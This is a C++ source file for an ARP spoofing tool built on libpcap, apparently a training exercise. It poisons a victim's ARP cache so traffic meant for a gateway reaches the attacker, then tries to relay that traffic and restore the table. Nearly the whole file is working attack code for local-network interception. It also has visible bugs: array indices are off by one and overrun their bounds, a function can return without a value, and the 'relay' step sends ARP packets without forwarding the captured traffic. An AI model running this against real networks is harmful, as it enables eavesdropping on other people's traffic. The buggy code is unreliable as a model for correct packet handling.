#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <map>



/* Send-arp Daechoong Process */

//==> Attacker packet send ->> reply packet come..

//===============================
// Ethernet_smac : Iam
// Ethernet_dmac : Broadcast
// ARPsender : Iam
// ARPtarget : sender = Victim
//===============================

//========reply packet============
// Ethernet_smac : sender = Victim
// Ethernet_dmac : Iam
// ARPsender : sender = Victim
// ARPtarget : Iam
//================================

// => Attacker can know Victim MAC address


/* Spoofing-arp Daechoong Process */

// ==> Spoofed 
//================================
// Ethernet_smac : Iam
// Ethernet_dmac : Sender = Victim
// ARPsender : Iam
// IPsender : Target(==Gateway)'s IP
// ARPtarget : Sender = Victim
// IPtarget : Sender's IP
//================================

//========reply packet ===========
// Ethernet_smac : Sender = Victim
// Ethernet_dmac : Iam
// ARPsender : Sender = Victim 
// IPsender : Sender = Victim
// ARPtarget : Iam
// IPtarget : Target(==Gateway)'s IP
//================================


// ==> Relay
//========request packet===========
// Ethernet_smac : Iam
// Ethernet_dmac : Target(==Gateway)
// ARPsender : Sender = Victim 
// IPsender : Sender = Victim
// ARPtarget : Target(==Gateway)
// IPtarget : Target(==Gateway)'s IP
//=================================




#pragma pack(push, 1)
typedef struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
}EthArpPacket;
#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

//https://tttsss77.tistory.com/138
#define MAC_ALEN 6
#define MAC_ADDR_FMT " %02X:%02X:%02X:%02X:%02X:%02X"
#define MAC_ADDR_FMT_ARGS(addr) addr[0],addr[1],addr[2],addr[3],addr[4],addr[5]

char* Get_MacAdddress(const char *ifname, uint8_t *mac_addr){
    struct ifreq ifr;
    int sockfd, ret; //open network socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("error1\n");
    }
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd,SIOCGIFHWADDR, &ifr);
    if(ret<0){close(sockfd); printf("error2\n");}
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
    if(ioctl(sockfd, SIOCGIFADDR, &ifr)<0) {
          printf("error3\n");
       }
       else
       {
           return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
       }
    close(sockfd);
}

void show_packet (uint8_t* packet, uint16_t packet_size){
 for (int i = 0; i < packet_size ; i++) {
    printf("%x ", packet[i]);
    if(((i + 1) % 16)==0) {
        printf("\n");
    }
    if(((i + 1) % 16)==8) {
        printf("  ");
    }
  }
  printf("============================\n");
}


int main(int argc, char* argv[]) {
  if (argc <4 || (argc %2) != 0) {
    usage();
    return -1;
  }
printf("%d", argc);
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    const char *ifname = argv[1];
    uint8_t mac_addr[MAC_ALEN];
    const char * my_ip = Get_MacAdddress(ifname,mac_addr);
    printf("Success to get myIP address as %s\n", my_ip);
    printf("Success to get myMAC address as" MAC_ADDR_FMT"\n ", MAC_ADDR_FMT_ARGS(mac_addr));
    


  char * sender_ip[(argc - 2) / 2];
  Mac sender_mac[(argc - 2) / 2];
  char * target_ip[(argc - 2) / 2];
  Mac target_mac[(argc - 2) / 2];
  
  for(int i=0; i< (argc - 2)/2; i++){
    sender_ip[i] = argv[2*i +2];
    target_ip[i] = argv[2*i +3];
  }

  
 //=============================================> Send-arp(1)  ->  Get Sender mac 
  int i = 0;
  while (i++ < (argc - 2)/2){
 
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(mac_addr);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(mac_addr);
    packet.arp_.sip_ = htonl(Ip(my_ip)); 
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip[i]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    
    while (true) {

    int reply_result = pcap_next_ex(handle, &header, &reply_packet); //reply packet come..
    if (reply_result == -1 || reply_result == -2) {
           printf("error4\n");
        }

    EthArpPacket *EthArpHeader = (struct EthArpPacket *)reply_packet;
          
    if (EthArpHeader->arp_.tmac_== Mac(mac_addr) && EthArpHeader->arp_.tip_ == Ip(my_ip) && EthArpHeader->arp_.sip_ == Ip(sender_ip[i])) {
            sender_mac[i]= EthArpHeader->arp_.smac_;
            break;
          }
     }
     
   }
     
 //=============================================> Send-arp(2)  ->  Get Target mac 
  i = 0;
  while (i++ < (argc - 2)/2){
 
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(mac_addr);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(mac_addr);
    packet.arp_.sip_ = htonl(Ip(my_ip)); 
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(target_ip[i]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    
    while (true) {

    int reply_result = pcap_next_ex(handle, &header, &reply_packet); //reply packet come..
    if (reply_result == -1 || reply_result == -2) {
           printf("error4\n");
        }

    EthArpPacket *EthArpHeader = (struct EthArpPacket *)reply_packet;
          
    if (EthArpHeader->arp_.tmac_== Mac(mac_addr) && EthArpHeader->arp_.tip_ == Ip(my_ip) && EthArpHeader->arp_.sip_ == Ip(target_ip[i])) {
            target_mac[i]= EthArpHeader->arp_.smac_;
            break;
          }
    }
     
   }     
   

 //=============================================> ARP Spoofed
  i = 0;
  while (i++ < (argc - 2)/2){
   		
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(sender_mac[i]);
    packet.eth_.smac_ = Mac(mac_addr);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(mac_addr);
    packet.arp_.sip_ = htonl(Ip(target_ip[i]));  
    packet.arp_.tmac_ = Mac(sender_mac[i]);  
    packet.arp_.tip_ = htonl(Ip(sender_ip[i])); 
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }    
  }


  // ==> Relay
  //========request packet===========
  // Ethernet_smac : Iam
  // Ethernet_dmac : Target(==Gateway)
  // ARPsender : Sender = Victim
  // IPsender : Sender = Victim
  // ARPtarget : Target(==Gateway)
  // IPtarget : Target(==Gateway)'s IP
  //=================================

 //=============================================> Relay Packets
  i = 0;
  int j=20;
  while (j--) {
   		
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    int reply_result = pcap_next_ex(handle, &header, &reply_packet); //reply packet come..
     if (reply_result == -1 || reply_result == -2) {
           printf("error4\n");
        }
    EthArpPacket *EthArpHeader = (struct EthArpPacket *)reply_packet;

    while(i++ < (argc - 2)/2){
    
    if (EthArpHeader->eth_.smac_ == sender_mac[i]) {
        EthArpPacket reppacket;
        reppacket.eth_.dmac_ = Mac(target_mac[i]);
        reppacket.eth_.smac_ = Mac(sender_mac[i]);
        reppacket.eth_.type_ = htons(EthHdr::Arp);
        reppacket.arp_.hrd_ = htons(ArpHdr::ETHER);
        reppacket.arp_.pro_ = htons(EthHdr::Ip4);
        reppacket.arp_.hln_ = Mac::SIZE;
        reppacket.arp_.pln_ = Ip::SIZE;
        reppacket.arp_.op_ = htons(ArpHdr::Reply);
        reppacket.arp_.smac_ = Mac(EthArpHeader->eth_.dmac_);
        reppacket.arp_.sip_ = htonl(Ip(sender_ip[i]));
        reppacket.arp_.tmac_ = Mac(target_mac[i]);
        reppacket.arp_.tip_ = htonl(Ip(target_ip[i]));


        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reppacket), sizeof(EthArpPacket));
        
	if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }    
    
      }
    
    }
       
  }
  
  
 //=============================================> Recover ARP table
  i = 0;
   while (i++ < (argc - 2)/2){
  

        EthArpPacket packet;

    	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    	packet.eth_.smac_ = Mac(sender_mac[i]);
    	packet.eth_.type_ = htons(EthHdr::Arp);
    	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    	packet.arp_.pro_ = htons(EthHdr::Ip4);
    	packet.arp_.hln_ = Mac::SIZE;
    	packet.arp_.pln_ = Ip::SIZE;
    	packet.arp_.op_ = htons(ArpHdr::Request);
    	packet.arp_.smac_ = Mac(sender_mac[i]);
    	packet.arp_.sip_ = htonl(Ip(sender_ip[i]));  
    	packet.arp_.tmac_ =  Mac("00:00:00:00:00:00");  
    	packet.arp_.tip_ = htonl(Ip(target_ip[i])); 
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }    
    
      
      printf("*****%s's arp table Recover*****\n", sender_ip[i]);
      printf("\n");
    
    }

    pcap_close(handle);
    

}










